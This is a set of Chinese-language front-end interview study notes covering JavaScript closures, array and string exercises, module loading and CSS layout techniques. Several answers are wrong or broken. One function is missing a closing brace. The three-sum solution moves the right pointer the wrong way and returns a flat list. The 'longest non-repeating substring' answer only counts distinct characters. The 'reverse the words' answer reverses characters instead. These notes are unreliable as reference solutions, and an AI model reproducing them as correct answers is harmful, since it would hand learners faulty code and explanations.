​ 可以避免使用全局变量，防止全局变量污染；
​ 可以让局部变量常驻在内存中；
​ 会造成内存泄漏（有一块内存空间被长期占用，而不被释放）

应用场景

1. 埋点（是网站分析的一种常用的数据采集方法）计数器

```js
function count() {
  var num = 0;
  return function () {
    return ++num
  }
}
var getNum = count();
var getNewNum = count();
document.querySelectorAll('button')[0].onclick = function(){
  console.log('点击加入购物车次数： '+getNum());
}
document.querySelectorAll('button')[1].onclick = function(){
  console.log('点击付款次数： '+getNewNum());
}    
```

1. 事件+循环

按照以下方式添加事件，打印出来的i不是按照序号的

形成原因就是操作的是同一个词法环境,因为onclick后面的函数都是一个闭包，但是操作的是同一个词法环境

```js
   var lis = document.querySelectorAll('li');
   for (var i = 0; i < lis.length; i++) {
            lis[i].onclick = function () {
                alert(i)
            }       
    }
```

解决办法：

使用匿名函数之后，就形成一个闭包， 操作的就是不同的词法环境

```js
var lis = document.querySelectorAll('li');  
for (var i = 0; i < lis.length; i++) {
     (function (j) {
                lis[j].onclick = function () {
                    alert(j)
                }
            })(i)
 }
```



### 





### JS应用篇

#### 字符串中的单词逆序输出（手写）

```js
let str = "Hello My name is kif and i am from XTU";
function reChange1(str) {
  return str.split("").reverse().join("");
}
console.log(reChange1(str));
```



```js
let str = "Hello My name is kif and i am from XTU";
function reChange2(str) {
  let newSTr = "";
  for (let i = str.length - 1; i >= 0; i--) {
    newSTr += str.charAt(i);
  }
  return newSTr

console.log(reChange2(str));
```



#### function rand(min, max, N)：生成长度是N，且在min、max内不重复的整数随机数组

**参考答案：**

把考点拆成了4个小项；需要用递归算法实现：
a) 生成一个长度为n的空数组arr。
b) 生成一个（min－max）之间的随机整数rand。
c) 把随机数rand插入到数组arr内，如果数组arr内已存在与rand相同的数字，则重新生成随机数rand并插入到 arr内[需要使用递归实现，不能使用for/while等循环]
d) 最终输出一个长度为n，且内容不重复的数组arr。



#### Math.random

```js
//产生一个[0，1)之间的随机数。
Math.random()：
 
//返回指定范围的随机数(m-n之间)的公式:
Math.random()*(n-m)+m；
或者
Math.random()*(n+1-m)+m
```



```js
function buildArray(arr, n, min, max) {
    var num = Math.floor(Math.random() * (max - min + 1)) + min;
    if (!arr.includes(num)) { arr.push(num); }
    return arr.length === n ? arr : buildArray(arr, n, min, max);
}
var result = buildArray([], 5, 2, 32);
console.table(result);
```



```js
function rand(min, max, N) {
  let arr = [];
  let l = 0;
  console.log(N);
  for (; l < N; ) {
    // console.log(l);
    let r = Math.floor(Math.random() * (max - min)) + min;
    if (!arr.includes(r)) {
      console.log(r);
      arr.push(r);
      l++;
    }
  }
  return arr;
}
console.log(rand(2, 61, 5));

```



#### 实现一个数组对象的去重，相同value的只保留最后一个，最好有多个思路

**参考答案**：

**1.遍历数组法**

它是最简单的数组去重方法（indexOf方法）

实现思路：新建一个数组，遍历去要重的数组，当值不在新数组的时候（indexOf为-1）就加入该新数组中；

```js
var arr=[2,8,5,0,5,2,6,7,2];
function unique1(arr){
  var hash=[];
  for (var i = 0; i < arr.length; i++) {
     if(hash.indexOf(arr[i])==-1){
      hash.push(arr[i]);
     }
  }
  return hash;
}
```

**2.数组下标判断法**

调用indexOf方法，性能和方法1差不多

实现思路：如果当前数组的第 i 项在当前数组中第一次出现的位置不是 i，那么表示第 i 项是重复的，忽略掉。否则存入结果数组。

```js
function unique2(arr){
  var hash=[];
  for (var i = 0; i < arr.length; i++) {
     if(arr.indexOf(arr[i])==i){
      hash.push(arr[i]);
     }
  }
  return hash;
}
```

**3.排序后相邻去除法**

实现思路：给传入的数组排序，排序后相同的值会相邻，然后遍历排序后数组时，新数组只加入不与前一值重复的值。

```js
function unique3(arr){
  arr.sort();
  var hash=[arr[0]];
  for (var i = 1; i < arr.length; i++) {
     if(arr[i]!=hash[hash.length-1]){
      hash.push(arr[i]);
     }
  }
  return hash;
}
```

**4.优化遍历数组法（推荐）**

实现思路：双层循环，外循环表示从0到arr.length，内循环表示从i+1到arr.length

将没重复的右边值放入新数组。（检测到有重复值时终止当前循环同时进入外层循环的下一轮判断）

```js
function unique4(arr){
  var hash=[];
  for (var i = 0; i < arr.length; i++) {
    for (var j = i+1; j < arr.length; j++) {
      if(arr[i]===arr[j]){
        ++i;
        break;
        }
    }
      hash.push(arr[i]);
  }
  return hash;
}
```

**5.ES6实现**

基本思路：ES6提供了新的数据结构Set。它类似于数组，但是成员的值都是唯一的，没有重复的值。

Set函数可以接受一个数组（或类似数组的对象）作为参数，用来初始化。

```js
function unique5(arr){
  var x = new Set(arr);
 return [...x];
}
```

扩展：如果重复，则去掉该元素

数组下标去重

```js
function unique22(arr){
  var hash=[];
  for (var i = 0; i < arr.length; i++) {
     if(arr.indexOf(arr[i])==arr.lastIndexOf(arr[i])){
      hash.push(arr[i]);
     }
  }
  return hash;
}
```

#### 传入 [1,[[2],3,4],5] ，返回 [1,2,3,4,5]

```js
let a = [1, [[2], '3', 4], 5];
function change(arr) {
  let x = arr.toString();
  let list = x.split(",");
  let ans = list.map((i) => {
    // console.log(i)
    return typeof i === 'string' ? Number(i) : i;
  });
  // console.log(ans)
  return ans;
}
console.log(change(a));

```

​       

ES6 增加了扩展运算符，用于取出参数对象的所有可遍历属性，拷贝到当前对象之中：

```js
var arr = [1, [2, [3, 4]]];
console.log([].concat(...arr)); // [1, 2, [3, 4]]
```

我们用这种方法只可以扁平一层，但是顺着这个方法一直思考，我们可以写出这样的方法：

```js
// 方法4
var arr = [1, [2, [3, 4]]];

function flatten(arr) {

    while (arr.some(item => Array.isArray(item))) {
        arr = [].concat(...arr);
    }

    return arr;
}

console.log(flatten(arr))
```



#### 用正则和非正则实现12345678.12=》12，345，678.12

```js
let num = 12345678.12
//12,345,678.12
function change(number) {
    let s = number.toString()
    //console.log(s)
    let L = s.split('.')
    let num_s
    L.length == 2 ? num_s = L[1] : num_s = -1
    let N=L[0]
    let num_f
    let y =N.length % 3
    num_f = N.slice(0, y)

    for (let i = y; i < N.length; i += 3) {
        num_f += ',' + N.slice(i,i+3)
    }
    if (num_s != -1) {
        num_f += '.' + num_s
    }
    return num_f
}
console.log(change(num))//12,345,678.12
```



#### 写一个判断是否是空对象的函数

**参考答案：**

```js
function isEmpty(value) {
    return (
        value === null || value === undefined ||
        (typeof value === 'object' && Object.keys(value).length === 0) 
    )
}
```



#### **给定一个字符串，请你找出其中不含有重复字符的 最长子串 的长度**

```js
function countWord(str) {
  let arr = [];
  let count = 0;
  for (let i = 0; i < str.length; i++) {
    console.log(str.charAt(i));
    if (!arr.includes(str.charAt(i))) {
      arr.push(str[i]);
      count++;
    }
  }
  console.log(arr);
  return count;
}
let str = "qqdwqcasdffdghjsbjhbm";
console.log(countWord(str));

```



#### 三数之和

**参考答案：**

题目描述

给定一个包含 n 个整数的数组 nums，判断 nums 中是否存在三个元素 a，b，c ，使得 a + b + c = 0 ？找出所有满足条件且不重复的三元组。

注意：答案中不可以包含重复的三元组。

```js
//例如, 给定数组 nums = [-1, 0, 1, 2, -1, -4]，
//满足要求的三元组集合为：
[
  [-1, 0, 1],
  [-1, -1, 2]
]
```





```js
let nums = [-1, 0, 1, 2, -1, -4];
function getNum(nums) {
  if (nums.length < 3) {
    return [];
  }
  let ans = [];
  nums.sort((a, b) => a - b);
  console.log(nums);
  for (let i = 0; i < nums.length; i++) {
    if (nums[i] > 0) {
      break;
    }
    let l = i + 1;
    let r = nums.length - 1;
    while (l < r) {
      let sum = nums[i] + nums[l] + nums[r];
      if (sum == 0) {
        ans.push(nums[i], nums[l], nums[r]);
        l++;
        r++;
      } else if (sum > 0) {
        r--;
      } else {
        l++;
      }
    }
  }
  return ans;
}
console.log(getNum(nums));

```











## 代码解释题

1.

```js
var company = {
    address: 'beijing'
}
var yideng = Object.create(company);
delete yideng.address
console.log(yideng.address);
// 写出执行结果，并解释原因

```

**答案**
beijing

**解析**
这里的 yideng 通过 prototype 继承了 company的 address。yideng自己并没有address属性。所以delete操作符的作用是无效的。

**扩展**
1.delete使用原则：delete 操作符用来删除一个对象的属性。
2.delete在删除一个不可配置的属性时在严格模式和非严格模式下的区别:
（1）在严格模式中，如果属性是一个不可配置（non-configurable）属性，删除时会抛出异常;
（2）非严格模式下返回 false。
3.delete能删除隐式声明的全局变量：这个全局变量其实是global对象(window)的属性
4.delete能删除的：
（1）可配置对象的属性（2）隐式声明的全局变量 （3）用户定义的属性 （4）在ECMAScript 6中，通过 const 或 let 声明指定的 "temporal dead zone" (TDZ) 对 delete 操作符也会起作用
delete不能删除的：
（2）显式声明的全局变量 （2）内置对象的内置属性 （3）一个对象从原型继承而来的属性
5.delete删除数组元素：
（1）当你删除一个数组元素时，数组的 length 属性并不会变小，数组元素变成undefined
（2）当用 delete 操作符删除一个数组元素时，被删除的元素已经完全不属于该数组。
（3）如果你想让一个数组元素的值变为 undefined 而不是删除它，可以使用 undefined 给其赋值而不是使用 delete 操作符。此时数组元素是在数组中的
6.delete 操作符与直接释放内存（只能通过解除引用来间接释放）没有关系。









## 模块化

### CommonJS规范

**参考答案：**

CommonJS规范加载模块是同步的，只有加载完成，才能执行后面的操作。

CommonJS规范中的module、exports和require

- 每个文件就是一个模块，有自己的作用域。每个模块内部，`module`变量代表当前模块，是一个对象，它的`exports`属性（即`module.exports`）是对外的接口。
- `module.exports`属性表示当前模块对外输出的接口，其他文件加载该模块，实际上就是读取`module.exports`变量。
- 为了方便，`Node`为每个模块提供一个`exports`变量，指向`module.exports`。

```js
let exports = module.exports;
```

- `require`命令用于加载模块文件。

使用示例：

```js
  //name.js
  exports.name = function(){return '李婷婷'}; //导出
  //getName.js
  let getName = require('name'); //引入
```

注：不能直接将`exports`变量指向一个值，因为这样等于切断了`exports`与`module.exports`的联系：如下

```js
exports = function(x){console.log(x)}
```

如果一个模块的对外接口，就是一个单一的值，不能使用`exports`输出，只能使用`module.exports`输出。

CommonJS模块导入用`require`，导出用`module.exports`。导出的对象需注意，如果是静态值，而且非常量，后期可能会有所改动的，请使用函数动态获取，否则无法获取修改值。导入的参数，是可以随意改动的，所以使用时要注意



### ~~ES6 module 和 CommonJS module 的区别~~

**参考答案**：

- 为**CommonJS**的`require`语法是同步的，所以就导致了**CommonJS**模块规范只适合用在服务端，而ES6模块无论是在浏览器端还是服务端都是可以使用的，但是在服务端中，还需要遵循一些特殊的规则才能使用 ；
- **CommonJS** 模块输出的是一个值的拷贝，而ES6 模块输出的是值的引用；
- **CommonJS** 模块是运行时加载，而ES6 模块是编译时输出接口，使得对JS的模块进行静态分析成为了可能
- 因为两个模块加载机制的不同，所以在对待循环加载的时候，它们会有不同的表现。**CommonJS**遇到循环依赖的时候，只会输出已经执行的部分，后续的输出或者变化，是不会影响已经输出的变量。而ES6模块相反，使用`import`加载一个变量，变量不会被缓存，真正取值的时候就能取到最终的值；
- 关于模块顶层的`this`指向问题，在**CommonJS**顶层，`this`指向当前模块；而在ES6模块中，`this`指向`undefined`；
- 关于两个模块互相引用的问题，在ES6模块当中，是支持加载**CommonJS**模块的。但是反过来，**CommonJS**并不能`require`ES6模块，在NodeJS中，两种模块方案是分开处理的。



### ~~ES6 module、CommonJS module 循环引用的问题~~

**参考答案：**

 循环加载指的是a脚本的执行依赖b脚本，b脚本的执行依赖a脚本

1. CommonJS模块是加载时执行。一旦出现某个模块被“循环加载”，就只输出已经执行的部分，没有执行的部分不会输出。

2. ES6模块对导出模块，变量，对象是动态引用，遇到模块加载命令import时不会去执行模块，只是生成一个指向被加载模块的引用。

   CommonJS模块规范主要适用于后端Node.js，后端Node.js是同步模块加载，所以在模块循环引入时模块已经执行完毕。推荐前端工程中使用ES6的模块规范，通过安装Babel转码插件支持ES6模块引入的语法。

**解析：**

1. CommonJS模块的加载原理

CommonJS模块就是一个脚本文件，require命令第一次加载该脚本时就会执行整个脚本，然后在内存中生成该模块的一个说明对象。

```js
{
    id: '',  //模块名，唯一
    exports: {  //模块输出的各个接口
        ...
    },
    loaded: true,  //模块的脚本是否执行完毕
    ...
}
```

以后用到这个模块时，就会到对象的exports属性中取值。即使再次执行require命令，也不会再次执行该模块，而是到缓存中取值。

CommonJS模块是加载时执行，即脚本代码在require时就全部执行。一旦出现某个模块被“循环加载”，就只输出已经执行的部分，没有执行的部分不会输出。

案例说明：

案例来源于Node官方说明：[nodejs.org/api/modules…](https://nodejs.org/api/modules.html#modules_cycles)

```js
//a.js
exports.done = false;

var b = require('./b.js');
console.log('在a.js中，b.done = %j', b.done);

exports.done = true;
console.log('a.js执行完毕！')

//b.js
exports.done = false;

var a = require('./a.js');
console.log('在b.js中，a.done = %j', a.done);

exports.done = true;
console.log('b.js执行完毕！')

//main.js
var a = require('./a.js');
var b = require('./b.js');

console.log('在main.js中，a.done = %j, b.done = %j', a.done, b.done);
```

输出结果如下：

```
//node环境下运行main.js
node main.js

在b.js中，a.done = false
b.js执行完毕！
在a.js中，b.done = true
a.js执行完毕！
在main.js中，a.done = true, b.done = true
```

JS代码执行顺序如下：

1）main.js中先加载a.js，a脚本先输出done变量，值为false，然后加载b脚本，a的代码停止执行，等待b脚本执行完成后，才会继续往下执行。

2）b.js执行到第二行会去加载a.js，这时发生循环加载，系统会去a.js模块对应对象的exports属性取值，因为a.js没执行完，从exports属性只能取回已经执行的部分，未执行的部分不返回，所以取回的值并不是最后的值。

3）a.js已执行的代码只有一行，exports.done = false;所以对于b.js来说，require a.js只输出了一个变量done，值为false。往下执行console.log('在b.js中，a.done = %j', a.done);控制台打印出：

```
在b.js中，a.done = false
```

4）b.js继续往下执行，done变量设置为true，console.log('b.js执行完毕！')，等到全部执行完毕，将执行权交还给a.js。此时控制台输出：

```
b.js执行完毕！
```

5）执行权交给a.js后，a.js接着往下执行，执行console.log('在a.js中，b.done = %j', b.done);控制台打印出：

```
在a.js中，b.done = true
```

6）a.js继续执行，变量done设置为true，直到a.js执行完毕。

```
a.js执行完毕！
```

7）main.js中第二行不会再次执行b.js，直接输出缓存结果。最后控制台输出：

```
在main.js中，a.done = true, b.done = true
```

总结：

1）在b.js中，a.js没有执行完毕，只执行了第一行，所以循环加载中，只输出已执行的部分。

2）main.js第二行不会再次执行，而是输出缓存b.js的执行结果。exports.done = true;

1. ES6模块的循环加载

ES6模块与CommonJS有本质区别，ES6模块对导出变量，方法，对象是动态引用，遇到模块加载命令import时不会去执行模块，只是生成一个指向被加载模块的引用，需要开发者保证真正取值时能够取到值，只要引用是存在的，代码就能执行。

案例说明：

```js
//even.js
import {odd} from './odd';

var counter = 0;
export function even(n){
    counter ++;
    console.log(counter);

    return n == 0 || odd(n-1);
}
复制代码
//odd.js
import {even} from './even.js';

export function odd(n){
    return n != 0 && even(n-1);
}
复制代码
//index.js
import * as m from './even.js';

var x = m.even(5);
console.log(x);

var y = m.even(4);
console.log(y);
```

**执行index.js，输出结果如下：**

```js
babel-node index.js

1
2
3
false
4
5
6
true
```

可以看出counter的值是累加的，ES6是动态引用。如果上面的引用改为CommonJS代码，会报错，因为在odd.js里，even.js代码并没有执行。改成CommonJS规范加载的代码为：

```js
//even.js
var odd = require('./odd.js');

var counter = 0;
module.exports = function even(n){
    counter ++;
    console.log(counter);

    return n == 0 || odd(n-1);
}
//odd.js
var even = require('./even.js');

module.exports = function odd(n){
    return n != 0 && even(n-1);
}
//index.js
var even = require('./even.js');

var x = even(5);
console.log(x);

var y = even(5);
console.log(y);
```

**执行index.js，输出结果如下：**

```
$ babel-node index.js
1
/Users/name/Projects/node/ES6/odd.1.js:6
    return n != 0 && even(n - 1);
                     ^

TypeError: even is not a function
    at odd (/Users/name/Projects/node/ES6/odd.1.js:4:22)
```





## Css:

### 1、未知高度元素垂直居中、垂直居中的实现方式有哪些？

**参考答案：**

**1、绝对定位+css3 transform:translate(-50%，-50%)**

```css
.wrap{
  position:relative;
}
.child{
  position: absolute;
  top:50%;
  left:50%;
  -webkit-transform:translate(-50%,-50%);
}
```

**2、css3 的flex布局**

```css
.wrap{
  display:flex;
  justify-content:center;
}
.child{
  align-self:center;
}
```

**3、table布局**

```css
<div class="wrap">
   <div class="child">
          <div>sadgsdgasgd</div>
   </div>
</div>
.wrap{
  display:table;
  text-align:center;
}
.child{
  background:#ccc;
  display:table-cell;
  vertical-align:middle;
}
.child div{
    width:300px;
    height:150px;
    background:red;
    margin:0 auto;
}
```



### 2、padding , margin 百分比单位依据

**参考答案**：

在CSS 盒模型中，依据CSS2.2文档，margin与padding的百分比指定值时，一律参考**包含盒的宽度**。
示例：

```css
        .father{
            height: 100px;
            width: 200px;
            border: solid;
        }

        .son{
            margin: 20%;
            padding: 20%;
            width: 50%;
            height: 50%;
        }
```

如下图，包括padding-top/bottom,margin-top/bottom在内，所有padding和margin均是参考的包含块的宽度，故它们的值为200px * 20% = 40px。





### 3、移动端 1px 问题

**参考答案**：

**问题**：1px 的边框，在高清屏下，移动端的1px 会很粗

**产生原因**

那么为什么会产生这个问题呢？主要是跟一个东西有关，DPR(devicePixelRatio) 设备像素比，它是默认缩放为100%的情况下，设备像素和CSS像素的比值。

```
window.devicePixelRatio=物理像素 /CSS像素
复制代码
```

目前主流的屏幕DPR=2 （iPhone 8）,或者3 （iPhone 8 Plus）。拿2倍屏来说，设备的物理像素要实现1像素，而DPR=2，所以css 像素只能是 0.5。一般设计稿是按照750来设计的，它上面的1px是以750来参照的，而我们写css样式是以设备375为参照的，所以我们应该写的0.5px就好了啊！ 试过了就知道，iOS 8+系统支持，安卓系统不支持。

**解决方案**

1. WWDC对iOS统给出的方案

   在 WWDC大会上，给出来了1px方案，当写 0.5px的时候，就会显示一个物理像素宽度的 border，而不是一个css像素的 border。 所以在iOS下，你可以这样写。

   ```css
   border:0.5px solid #E5E5E5
   ```

   可能你会问为什么在3倍屏下，不是0.3333px 这样的？经过测试，在Chrome上模拟iPhone 8Plus，发现小于0.46px的时候是显示不出来。

   **总结：**

   - 优点：简单，没有副作用
   - 缺点：支持iOS 8+，不支持安卓。后期安卓follow就好了。

2. 使用边框图片

   ```css
    border: 1px solid transparent;
    border-image: url('./../../image/96.jpg') 2 repeat;
   ```

   **总结：**

   - 优点：没有副作用
   - 缺点：border颜色变了就得重新制作图片；圆角会比较模糊。

3. 使用box-shadow实现

   ```css
   box-shadow: 0  -1px 1px -1px #e5e5e5,   //上边线
               1px  0  1px -1px #e5e5e5,   //右边线
               0  1px  1px -1px #e5e5e5,   //下边线
               -1px 0  1px -1px #e5e5e5;   //左边线
   ```

    **总结**

   - 优点：使用简单，圆角也可以实现
   - 缺点：模拟的实现方法，仔细看谁看不出来这是阴影不是边框。

4. 使用伪元素

   1条border

   ```css
   .setOnePx{
     position: relative;
     &::after{
       position: absolute;
       content: '';
       background-color: #e5e5e5;
       display: block;
       width: 100%;
       height: 1px; /*no*/
       transform: scale(1, 0.5);
       top: 0;
       left: 0;
     }
   }
   ```

   可以看到，将伪元素设置绝对定位，并且和父元素的左上角对齐，将width 设置100%，height设置为1px，然后进行在Y方向缩小`0.5倍`。

   4 条border

   ```css
   .setBorderAll{
        position: relative;
          &:after{
              content:" ";
              position:absolute;
              top: 0;
              left: 0;
              width: 200%;
              height: 200%;
              transform: scale(0.5);
              transform-origin: left top;
              box-sizing: border-box;
              border: 1px solid #E5E5E5;
              border-radius: 4px;
         }
       }
   ```

   同样为伪元素设置绝对定位，并且和父元素左上角对其。将伪元素的长和宽先放大2倍，然后再设置一个边框，以左上角为中心，缩放到原来的`0.5倍`

   **总结：**

   - 优点：全机型兼容，实现了真正的1px，而且可以圆角。
   - 缺点：暂用了after 伪元素，可能影响清除浮动。

5. 设置viewport的scale值

   这个解决方案是利用viewport+rem+js 实现的。

   ```html
   <html>
     <head>
         <title>1px question</title>
         <meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
         <meta name="viewport" id="WebViewport" content="initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no">        
         <style>
             html {
                 font-size: 1px;
             }            
             * {
                 padding: 0;
                 margin: 0;
             }
             .top_b {
                 border-bottom: 1px solid #E5E5E5;
             }
   
             .a,.b {
                         box-sizing: border-box;
                 margin-top: 1rem;
                 padding: 1rem;                
                 font-size: 1.4rem;
             }
   
             .a {
                 width: 100%;
             }
   
             .b {
                 background: #f5f5f5;
                 width: 100%;
             }
         </style>
         <script>
             var viewport = document.querySelector("meta[name=viewport]");
             //下面是根据设备像素设置viewport
             if (window.devicePixelRatio == 1) {
                 viewport.setAttribute('content', 'width=device-width,initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no');
             }
             if (window.devicePixelRatio == 2) {
                 viewport.setAttribute('content', 'width=device-width,initial-scale=0.5, maximum-scale=0.5, minimum-scale=0.5, user-scalable=no');
             }
             if (window.devicePixelRatio == 3) {
                 viewport.setAttribute('content', 'width=device-width,initial-scale=0.3333333333333333, maximum-scale=0.3333333333333333, minimum-scale=0.3333333333333333, user-scalable=no');
             }
             var docEl = document.documentElement;
             var fontsize = 32* (docEl.clientWidth / 750) + 'px';
             docEl.style.fontSize = fontsize;
         </script>
     </head>
     <body>
         <div class="top_b a">下面的底边宽度是虚拟1像素的</div>
         <div class="b">上面的边框宽度是虚拟1像素的</div>
     </body>
   </html>
   ```

   **总结**

   - 优点：全机型兼容，直接写`1px`不能再方便
   - 缺点：适用于新的项目，老项目可能改动大



### 4、BFC

**参考答案**：

1. **简介**

   在解释BFC之前，先说一下文档流。我们常说的文档流其实分为**定位流**、**浮动流**、**普通流**三种。而普通流其实就是指BFC中的FC。FC(Formatting Context)，直译过来是格式化上下文，它是页面中的一块渲染区域，有一套渲染规则，决定了其子元素如何布局，以及和其他元素之间的关系和作用。常见的FC有BFC、IFC，还有GFC和FFC。

   **BFC**(Block Formatting Context)块级格式化上下文，是用于布局块级盒子的一块渲染区域。[MDN上的解释](https://developer.mozilla.org/zh-CN/docs/Web/Guide/CSS/Block_formatting_context)：BFC是Web页面 CSS 视觉渲染的一部分，用于决定块盒子的布局及浮动相互影响范围的一个区域。

   注意：一个BFC的范围包含创建该上下文元素的所有子元素，但**不包括**创建了新BFC的子元素的内部元素。这从另一方角度说明，一个元素不能同时存在于两个BFC中。因为如果一个元素能够同时处于两个BFC中，那么就意味着这个元素能与两个BFC中的元素发生作用，就违反了BFC的隔离作用。

2. **三种文档流的定位方案**

   **常规流(Normal flow)**

   - 在常规流中，盒一个接着一个排列;
   - 在块级格式化上下文里面， 它们竖着排列；
   - 在行内格式化上下文里面， 它们横着排列;
   - 当position为static或relative，并且float为none时会触发常规流；
   - 对于静态定位(static positioning)，position: static，盒的位置是常规流布局里的位置；
   - 对于相对定位(relative positioning)，position: relative，盒偏移位置由top、bottom、left、right属性定义。即使有偏移，仍然保留原有的位置，其它常规流不能占用这个位置。

   **浮动(Floats)**

   - 左浮动元素尽量靠左、靠上，右浮动同理
   - 这导致常规流环绕在它的周边，除非设置 clear 属性
   - 浮动元素不会影响块级元素的布局
   - 但浮动元素会影响行内元素的布局，让其围绕在自己周围，撑大父级元素，从而间接影响块级元素布局
   - 最高点不会超过当前行的最高点、它前面的浮动元素的最高点
   - 不超过它的包含块，除非元素本身已经比包含块更宽
   - 行内元素出现在左浮动元素的右边和右浮动元素的左边，左浮动元素的左边和右浮动元素的右边是不会摆放浮动元素的

   **绝对定位(Absolute positioning)**

   - 绝对定位方案，盒从常规流中被移除，不影响常规流的布局；
   - 它的定位相对于它的包含块，相关CSS属性：top、bottom、left、right；
   - 如果元素的属性position为absolute或fixed，它是绝对定位元素；
   - 对于position: absolute，元素定位将相对于上级元素中最近的一个relative、fixed、absolute，如果没有则相对于body；

3. **BFC触发方式**

   3.1 根元素，即HTML标签

   3.2 浮动元素：float值为`left`、`right`

   3.3 overflow值不为 visible，为 `auto`、`scroll`、`hidden`

   3.4 display值为 `inline-block`、`table-cell`、`table-caption`、`table`、`inline-table`、`flex`、`inline-flex`、`grid`、`inline-grid`

   3.5 定位元素：position值为 `absolute`、`fixed`

   **注意：**display:table也可以生成BFC的原因在于Table会默认生成一个匿名的table-cell，是这个匿名的table-cell生成了BFC。

4. **约束规则**

   浏览器对BFC区域的约束规则：

   1. 生成BFC元素的子元素会一个接一个的放置。
   2. 垂直方向上他们的起点是一个包含块的顶部，两个相邻子元素之间的垂直距离取决于元素的margin特性。在BFC中相邻的块级元素的外边距会折叠(Mastering margin collapsing)
   3. 生成BFC元素的子元素中，每一个子元素左外边距与包含块的左边界相接触（对于从右到左的格式化，右外边距接触右边界），即使浮动元素也是如此（尽管子元素的内容区域会由于浮动而压缩），除非这个子元素也创建了一个新的BFC（如它自身也是一个浮动元素）。

   规则解读：

   1. 内部的Box会在垂直方向上一个接一个的放置
   2. 内部的Box垂直方向上的距离由margin决定。（完整的说法是：属于同一个BFC的两个相邻Box的margin会发生折叠，不同BFC不会发生折叠。）
   3. 每个元素的左外边距与包含块的左边界相接触（从左向右），即使浮动元素也是如此。（这说明BFC中子元素不会超出他的包含块，而position为absolute的元素可以超出他的包含块边界）
   4. BFC的区域不会与float的元素区域重叠
   5. 计算BFC的高度时，浮动子元素也参与计算

5. **作用**

   BFC是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面元素，反之亦然。我们可以利用BFC的这个特性来做很多事。

   5.1 阻止元素被浮动元素覆盖

    一个正常文档流的block元素可能被一个float元素覆盖，挤占正常文档流，因此可以设置一个元素的float、 display、position值等方式触发BFC，以阻止被浮动盒子覆盖。

   5.2 可以包含浮动元素

    通过改变包含浮动子元素的父盒子的属性值，触发BFC，以此来包含子元素的浮动盒子。

   5.3 阻止因为浏览器因为四舍五入造成的多列布局换行的情况

    有时候因为多列布局采用小数点位的width导致因为浏览器因为四舍五入造成的换行的情况，可以在最后一 列触发BFC的形式来阻止换行的发生。比如下面栗子的特殊情况

   5.4 阻止相邻元素的margin合并

    属于同一个BFC的两个相邻块级子元素的上下margin会发生重叠，(设置writing-mode:tb-rl时，水平 margin会发生重叠)。所以当两个相邻块级子元素分属于不同的BFC时可以阻止margin重叠。
   这里给任一个相邻块级盒子的外面包一个div，通过改变此div的属性使两个原盒子分属于两个不同的BFC，以此来阻止margin重叠。





### 5、移动端适配方案

**参考答案：**

适配思路

设计稿（750*1334） ---> 开发 ---> 适配不同的手机屏幕，使其显得合理

原则

1. 开发时方便，写代码时设置的值要和标注的 160px 相关
2. 方案要适配大多数手机屏幕，并且无 BUG
3. 用户体验要好，页面看着没有不适感

思路

1. 写页面时，按照设计稿写固定宽度，最后再统一缩放处理，在不同手机上都能用
2. 按照设计稿的标准开发页面，在手机上部分内容根据屏幕宽度等比缩放，部分内容按需要变化，需要缩放的元素使用 rem, vw 相对单位，不需要缩放的使用 px
3. 固定尺寸+弹性布局，不需要缩放

**viewport 适配**

根据设计稿标准（750px 宽度）开发页面，写完后页面及元素自动缩小，适配 375 宽度的屏幕

在 head 里设置如下代码

```html
<meta name="viewport" content="width=750,initial-scale=0.5">
```

initial-scale = 屏幕的宽度 / 设计稿的宽度

为了适配其他屏幕，需要动态的设置 initial-scale 的值

```html
<head>
  <script>
    const WIDTH = 750
    const mobileAdapter = () => {
      let scale = screen.width / WIDTH
      let content = `width=${WIDTH}, initial-scale=${scale}, maximum-scale=${scale}, minimum-scale=${scale}`
      let meta = document.querySelector('meta[name=viewport]')
      if (!meta) {
        meta = document.createElement('meta')
        meta.setAttribute('name', 'viewport')
        document.head.appendChild(meta)
      }
      meta.setAttribute('content',content)
    }
    mobileAdapter()
    window.onorientationchange = mobileAdapter //屏幕翻转时再次执行
  </script>
</head>
```

缺点就是边线问题，不同尺寸下，边线的粗细是不一样的（等比缩放后），全部元素都是等比缩放，实际显示效果可能不太好

**vw 适配（部分等比缩放）**

1. 开发者拿到设计稿（假设设计稿尺寸为750px，设计稿的元素标注是基于此宽度标注）
2. 开始开发，对设计稿的标注进行转换，把px换成vw。比如页面元素字体标注的大小是32px，换成vw为 (100/750)*32 vw
3. 对于需要等比缩放的元素，CSS使用转换后的单位
4. 对于不需要缩放的元素，比如边框阴影，使用固定单位px

关于换算，为了开发方便，利用自定义属性，CSS变量

```html
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
  <script>
    const WIDTH = 750
    //:root { --width: 0.133333 } 1像素等于多少 vw
    document.documentElement.style.setProperty('--width', (100 / WIDTH)) 
  </script>
</head>
```

注意此时，meta 里就不要去设置缩放了

业务代码里就可以写

```css
header {
  font-size: calc(28vw * var(--width))
}
```

实现了按需缩放

**rem 适配**

1. 开发者拿到设计稿（假设设计稿尺寸为750px，设计稿的元素标是基于此宽度标注）
2. 开始开发，对设计稿的标注进行转换
3. 对于需要等比缩放的元素，CSS使用转换后的单位
4. 对于不需要缩放的元素，比如边框阴影，使用固定单位px

假设设计稿的某个字体大小是 40px, 手机屏幕上的字体大小应为 420/750*40 = 22.4px (体验好)，换算成 rem（相对于 html 根节点，假设 html 的 font-size = 100px,）则这个字体大小为 0.224 rem

写样式时，对应的字体设置为 0.224 rem 即可，其他元素尺寸也做换算...

但是有问题

举个 ，设计稿的标注 是40px，写页面时还得去做计算，很麻烦（全部都要计算）

能不能规定一下，看到 40px ,就应该写 40/100 = 0.4 rem,这样看到就知道写多少了（不用计算），此时的 html 的 font-size 就不能是 100px 了，应该为 (420*100)/750 = 56px，100为我们要规定的那个参数

根据不同屏幕宽度，设置 html 的 font-size 值

```html
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
  <script>
    const WIDTH = 750 //设计稿尺寸
    const setView = () => {
      document.documentElement.style.fontSize = (100 * screen.width / WIDTH) + 'px'
    }
    window.onorientationchange = setView
    setView()
  </script>
</head>
```

对于需要等比缩放的元素，CSS使用转换后的单位

```css
header {
  font-size: .28rem;
}
```

对于不需要缩放的元素，比如边框阴影，使用固定单位px

```css
header > span.active {
  color: #fff;
